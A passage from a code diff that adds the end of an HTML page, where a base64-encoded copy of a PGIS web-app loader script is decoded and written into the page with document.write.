uc3JjZG9jID0KICAgICAgICAgICAgcHJlcGFyZUhUTUwoCiAgICAgICAgICAgICAgICB1cmwsCiAgICAgICAgICAgICAgICBodG1sCiAgICAgICAgICAgICk7CgogICAgICAgIGlmcmFtZS5zdHlsZS5kaXNwbGF5ID0KICAgICAgICAgICAgImJsb2NrIjsKCiAgICAgICAgc3RhdHVzLnN0eWxlLmRpc3BsYXkgPQogICAgICAgICAgICAibm9uZSI7CiAgICB9CgogICAgLyoKICAgICAqIFN0YXJ0IG9ubHkgYWZ0ZXIgdGhlIHdob2xlIGxvYWRlciBoYXMKICAgICAqIGJlZW4gcGFyc2VkLgogICAgICovCiAgICB0cnkgewoKICAgICAgICBzZXRTdGF0dXMoCiAgICAgICAgICAgICJTdGFydGluZyBkaXJlY3QgUEdJUyBsb2FkZXIuLi4iCiAgICAgICAgKTsKCiAgICAgICAgbG9hZE1haW4oKS5jYXRjaChmdW5jdGlvbiAoZXJyb3IpIHsKCiAgICAgICAgICAgIC8qCiAgICAgICAgICAgICAqIGZldGNoUEdJUyBub3JtYWxseSBkaXNwbGF5cyB0aGUKICAgICAgICAgICAgICogZGV0YWlsZWQgZXJyb3IgaXRzZWxmLgogICAgICAgICAgICAgKi8KICAgICAgICAgICAgaWYgKAogICAgICAgICAgICAgICAgc3RhdHVzLnN0eWxlLmRpc3BsYXkgIT09ICJub25lIgogICAgICAgICAgICApIHsKICAgICAgICAgICAgICAgIGZhaWwoCiAgICAgICAgICAgICAgICAgICAgIkNvdWxkIG5vdCBsb2FkIFBHSVMiLAogICAgICAgICAgICAgICAgICAgIGVycm9yLAogICAgICAgICAgICAgICAgICAgIFBHSVMgKyAiaW5kZXguaHRtbCIsCiAgICAgICAgICAgICAgICAgICAgIlRoZSBsb2FkZXIgZmFpbGVkIGJlZm9yZSBQR0lTIGNvdWxkIGJlIGRpc3BsYXllZC4iCiAgICAgICAgICAgICAgICApOwogICAgICAgICAgICB9CgogICAgICAgIH0pOwoKICAgIH0gY2F0Y2ggKGVycm9yKSB7CgogICAgICAgIGZhaWwoCiAgICAgICAgICAgICJMb2FkZXIgZmFpbGVkIHRvIHN0YXJ0IiwKICAgICAgICAgICAgZXJyb3IsCiAgICAgICAgICAgICIiLAogICAgICAgICAgICAiQSBzeW5jaHJvbm91cyBKYXZhU2NyaXB0IGVycm9yIG9jY3VycmVkLiIKICAgICAgICApOwogICAgfQoKfSkoKTsKPC9zY3JpcHQ+Cgo8L2JvZHk+CjwvaHRtbD4=";
+  var bin=atob(b);
+  var bytes=new Uint8Array(bin.length);
+  for(var i=0;i<bin.length;i++)bytes[i]=bin.charCodeAt(i);
+  var html=new TextDecoder().decode(bytes);
+  document.open();
+  document.write(html);
+  document.close();
+},600);
+  </script>
+</body>
+
+</html>
